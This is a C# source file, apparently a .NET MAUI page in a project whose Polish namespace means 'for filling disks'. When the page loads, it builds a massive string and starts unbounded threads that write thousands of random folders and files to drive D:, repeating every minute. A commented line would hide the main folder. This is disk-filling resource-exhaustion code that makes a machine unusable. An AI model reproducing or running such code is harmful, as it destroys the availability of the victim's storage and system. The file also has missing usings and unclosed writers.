using System;
using System.Windows;

namespace DoZapełnianiaDyskow
{

    public partial class MainPage : ContentPage
    {
        int numberOfFiles = 3000;
        int numberOfFolders = 100;
        static int bytesInFile = 1000;
        static bool isCopying = false;
        static char toString = 'a';
        int MBOfStartCopying = 1000000;
        static string mainString = string.Empty;
        static List<string> names = new List<string>();
        string globalPath = @"d:\";
        string firstFolder = @"d:\mainFolder";
        public MainPage()
        {
            string sourceDir = @"d:\testowy";
            string destDir = @"d:\b";
            //try
            //{
            //    long folderSize = GetDirectorySize(new DirectoryInfo(sourceDir));
            //    Console.WriteLine($"Rozmiar folderu: {folderSize} bajtów");
            //    Console.WriteLine($"Rozmiar folderu: {folderSize / (1024.0 * 1024.0):F2} MB");
            //}
            //catch (Exception e) { Console.WriteLine("Wystąpił błąd: " + e.Message); }

            //try
            //{
            //    CopyDirectory(sourceDir, destDir);
            //    Console.WriteLine("Folder został skopiowany pomyślnie.");
            //}
            //catch (Exception e)
            //{
            //    Console.WriteLine("Wystąpił błąd: " + e.Message);
            //}
            //File.SetAttributes(folderPath, FileAttributes.Hidden);
            CreateNames();
            CreateMainString();
            Directory.CreateDirectory(firstFolder);
            Thread threadd = new Thread(new ParameterizedThreadStart(CreateFolders));
            threadd.Start(firstFolder);
        }
        public static void CopyDirectory(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);
            foreach (string filePath in Directory.GetFiles(sourceDir))
            {
                string fileName = Path.GetFileName(filePath); string destFilePath = Path.Combine(destDir, fileName);
                File.Copy(filePath, destFilePath, true);
            }
            foreach (string directoryPath in Directory.GetDirectories(sourceDir))
            {
                string dirName = Path.GetFileName(directoryPath);
                string destDirPath = Path.Combine(destDir, dirName); CopyDirectory(directoryPath, destDirPath);
            }
        }
        static long GetDirectorySize(DirectoryInfo dirInfo)
        {
            long size = 0;
            FileInfo[] files = dirInfo.GetFiles();
            foreach (FileInfo file in files)
            {
                size += file.Length;
            }
            DirectoryInfo[] directories = dirInfo.GetDirectories();
            foreach (DirectoryInfo directory in directories)
            {
                size += GetDirectorySize(directory);
            }
            return size;
        }
        string CreateString()
        {
            Random random = new Random();
            int tmp = random.Next(8, 15);
            string str = string.Empty;
            for (int i = 0; i < tmp; i++)
            {
                char c = (char)(random.Next((int)'a', (int)'z'));
                str += c.ToString();
            }
            return str;
        }
        void CreateNames()
        {
            for (int i = 0; i < numberOfFiles; i++)
            {
                names.Add(CreateString());
            }
        }
        void CreateMainString()
        {
            int j = 0;
            for (int i = 0; i < names.Count / 2; i++)
            {
                mainString += names[i];
            }
            try
            {
                for ( j = 0; j < 100000; j++)
                {
                    mainString += mainString;
                }
            }
            catch
            {
                int p = 0;
            }

            int iy = 0;
        }
        static void CreateFolders(object mainPath)
        {
            if (!isCopying)
                for (int i = 0; i < names.Count; i++)
                {
                    Thread thread = new Thread(new ParameterizedThreadStart(CreateFiles));
                    thread.Start(mainPath as string + @"\" + names[i]);
                }
        }
        static void CreateFile(object path)
        {
            StreamWriter streamWriter = new StreamWriter(path as string, false);
            streamWriter.Write(mainString);
        }
        static void CreateFiles(object path)
        {
            if (!Directory.Exists(path as string))
            {
                Directory.CreateDirectory(path as string);
                for (int i = 0; i < names.Count; i++)
                {
                    Thread thread = new Thread(new ParameterizedThreadStart(CreateFile));
                    thread.Start(path as string + @"\" + names[i]);
                }
            }
            Thread.Sleep(1000 * 60);
            Thread threadd = new Thread(new ParameterizedThreadStart(CreateFolders));
            threadd.Start(path as string);
        }
    }
}
